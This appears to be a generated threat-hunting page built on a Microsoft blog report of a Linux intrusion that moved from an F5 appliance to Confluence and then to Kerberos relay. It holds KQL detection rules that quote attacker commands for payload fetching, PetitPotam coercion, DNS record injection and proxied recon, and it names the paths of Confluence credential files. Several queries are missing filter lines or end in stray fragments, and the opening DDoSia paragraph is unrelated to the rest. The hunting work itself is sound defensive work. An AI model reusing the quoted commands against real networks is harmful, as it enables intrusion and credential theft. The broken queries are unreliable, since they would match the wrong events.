Hunts endpoint-originated outbound TCP connections to ASN ranges historically operated by Stark Industries, PQ-Hosting and Mirhosting that hosted NoName057(16) DDoSia C2 panels, paired with non-browser initiator processes. The 22 May 2026 FIOD seizure named NoName057(16) as the primary tenant; any residual DDoSia bot still beaconing to these prefixes after takedown is high-value. Rationale: The article names Stark Industries, PQ-Hosting (pq.hosting / pq.company), THE.Hosting/WorkTitans and Mirhosting as the seized transit layer and explicitly ties them to NoName057(16) DDoS operations. The CIDRs come from Team Cymru's published Stark/PQ allocation list (AS44477 / AS208476 / AS214943) and Sekoia's NoName057(16) DDoSia tracker, which are the public second sources for the article's claims. Pairing the prefix with a non-browser initiator separates a residual DDoSia bot or other implant from analyst web browsing. Cross-checked against: • https://www.team-cymru.com/post/stark-industries-solutions-an-iron-hammer-in-the-cloud • https://blog.sekoia.io/following-noname05716-ddosia-projects-targets/ • https://attack.mitre.org/groups/G1024/ • https://www.fiod.nl/

From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence

Microsoft Security Blog
2026-05-22 15 use cases 17 techniques 6 kill-chain phases detected

A multi-stage attack on Linux devices began with an exposed F5 BIG-IP edge appliance and pivoted to an internal Confluence server for credential theft and identity compromise. Learn how the threat actor attempted Kerberos relay and lateral movement, and how Microsoft Defender detected, blocked, and unraveled the attack. The post From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence appeared first on Microsoft Security Blog .

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] gowitness HTTP/HTTPS recon scan with Chrome SOCKS5 proxy on internal subnet · Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Linux wget/curl fetching HackTool:Linux/MalPack.B from 206.189.27.39:8888
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] NetExec/nxc PetitPotam coerce_plus with marshalled-target SMB payload · [LLM] CVE-2025-33073 Reflective Kerberos Relay exploit script + dnstool DNS record injection · Article-specific behavioural hunt — From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Linux curl FTP fetch writing payload into /dev/shm (tmpfs staging) · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Confluence credential file access (server.xml / confluence.cfg.xml) by non-Confluence process · Remote service execution — PsExec / SMB lateral movement · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
[LLM] Linux wget/curl fetching HackTool:Linux/MalPack.B from 206.189.27.39:8888 Delivery High
Detects wget or curl invocations from a Linux host reaching the Microsoft-reported staging IP 206.189.27.39 on port 8888 (path /5), used to deliver the custom scanning tool (SHA256 4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465) classified by Defender as HackTool:Linux/MalPack.B. Rationale: Anchors on the exact IP literal 206.189.27.39 from Microsoft's IOC list and the wget/curl downloader pattern shown verbatim in Block 2. Cross-checked with Microsoft Security Intelligence HackTool:Linux/MalPack.B family page. Cross-checked against: • https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool%3ALinux%2FMalPack.B&ThreatID=2147926274

| where FileName in~ ("wget","curl") or InitiatingProcessFileName in~ ("wget","curl")
| where ProcessCommandLine has "206.189.27.39" or InitiatingProcessCommandLine has "206.189.27.39"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName endswith "/wget" or ActingProcessName endswith "/curl" or ActingProcessName =~ "wget" or ActingProcessName =~ "curl"
| where ActingProcessCommandLine has "206.189.27.39"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName

[LLM] Linux curl FTP fetch writing payload into /dev/shm (tmpfs staging) Installation High
Detects curl invocations that fetch over ftp:// and write the output into /dev/shm/* — the exact pattern Microsoft observed when the actor bypassed Confluence host-level write blocks by serving a custom scanner over a Python ftplib FTP server and pulling it into shared memory. Rationale: Anchors on Block 3 verbatim: `curl -o /dev/shm/ag ftp://anonymous:anonymous@[REDACTED_LOCAL_IP]/5`. The ftp:// + /dev/shm/ combination is extremely rare in benign Linux ops — almost no legitimate package or admin tooling uses anonymous FTP into tmpfs.

| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName endswith "/curl" or ActingProcessName =~ "curl"
| where ActingProcessCommandLine has "ftp://" and ActingProcessCommandLine has "/dev/shm/"

[LLM] Confluence credential file access (server.xml / confluence.cfg.xml) by non-Confluence process Actions on Objectives High
Detects any process reading /opt/atlassian/confluence/conf/server.xml or /var/atlassian/application-data/confluence/confluence.cfg.xml where the actor is not Tomcat/Confluence itself. Microsoft observed the actor pulling DB credentials and JIRA service account creds from these two files after RCE, then using them for NTLM/Kerberos relay against AD. Rationale: Anchors on the two exact file paths Microsoft cites: `/opt/atlassian/confluence/conf/server.xml` and `/var/atlassian/application-data/confluence/confluence.cfg.xml`. These files store Confluence's DB connection strings (often containing the JiraServices/atlassian service account passwords later relayed against AD).

[LLM] NetExec/nxc PetitPotam coerce_plus with marshalled-target SMB payload Exploitation High
Detects invocation of NetExec (nxc) using the coerce_plus -M module with PetitPotam and the marshalled SPN target string (`localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`) — the exact authentication-coercion technique Microsoft observed prior to the CVE-2025-33073 relay. Rationale: Anchors on the verbatim NetExec command line from the article: `nxc smb [IP] -d ... -u Jiraservices -p '...' -M coerce_plus -o M=PetitPotam L="localhost1UWhRCAAAA..."`. The marshalled-target string `localhost1UWhRC` is the signature of CVE-2025-33073-style SPN spoofing — corroborated by BreakPoint Labs writeup of the exploit primitive. Cross-checked against: • https://breakpoint-labs.com/exploiting-the-reflective-kerberos-relay-flaw-cve-2025-33073/ • https://blog.syss.com/posts/kerberos-reflection/
ATT&CKT1187 T1557.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has_any ("coerce_plus","M=PetitPotam","localhost1UWhRC")
   or (FileName in~ ("nxc","netexec") and ProcessCommandLine has "-M ")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessCommandLine has_any ("coerce_plus","M=PetitPotam","localhost1UWhRC")

| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName

[LLM] CVE-2025-33073 Reflective Kerberos Relay exploit script + dnstool DNS record injection Exploitation High
Detects execution of the public CVE-2025-33073 exploit (CVE-2025-33073.py) and/or krbrelayx's dnstool.py being used to add a DNS record containing the marshalled SPN string — the two-step combo Microsoft observed for the Kerberos reflection attack against an unpatched DC/member server. Rationale: Anchors on the literal `CVE-2025-33073.py` filename and `dnstool.py ... -a add -r localhost1UWhRCAAAA...` shown verbatim in the article. The marshalled-target SPN combined with DNS record add is the published exploit primitive — confirmed against BreakPoint Labs and SySS reflective-Kerberos writeups. Cross-checked against: • https://breakpoint-labs.com/exploiting-the-reflective-kerberos-relay-flaw-cve-2025-33073/ • https://blog.syss.com/posts/kerberos-reflection/ • https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073

[LLM] gowitness HTTP/HTTPS recon scan with Chrome SOCKS5 proxy on internal subnet Reconnaissance Medium
Detects execution of the `gowitness` web-screenshot tool (SHA256 57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517) with the article-specific argument pattern: `scan nmap`, `--write-screenshots`, `--screenshot-fullpage`, `--chrome-proxy socks5://`. Microsoft observed this as the actor's web-app inventory step before identifying the vulnerable Confluence server. Rationale: Anchors on Block 1 verbatim (`gowitness scan nmap -f $i --write-db --write-screenshots --screenshot-fullpage --open-only --service-contains http --delay 5 --threads 1 --chrome-proxy socks5://127.0.0.1:9090`) and the article-supplied SHA256 hash 57b3188e... for the gowitness binary the actor staged. The SOCKS5 proxy on 127.0.0.1:9090 is the actor's pivot for visiting internal web apps via the staging host.
ATT&CKT1595.002 T1046

DeviceProcessEvents
| where Timestamp > ago(30d)

   or (ProcessCommandLine has_all ("--write-screenshots","--chrome-proxy","socks5://"))
   or SHA256 == "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName endswith "/gowitness" or ActingProcessName =~ "gowitness"
   or ActingProcessCommandLine has "gowitness scan nmap"
   or (ActingProcessCommandLine has "--write-screenshots" and ActingProcessCommandLine has "socks5://" and ActingProcessCommandLine has "--chrome-proxy")
   or SHA256 == "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, SHA256, ParentProcessName

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

    by _time span=10s, All_Traffic.src, All_Traffic.dest
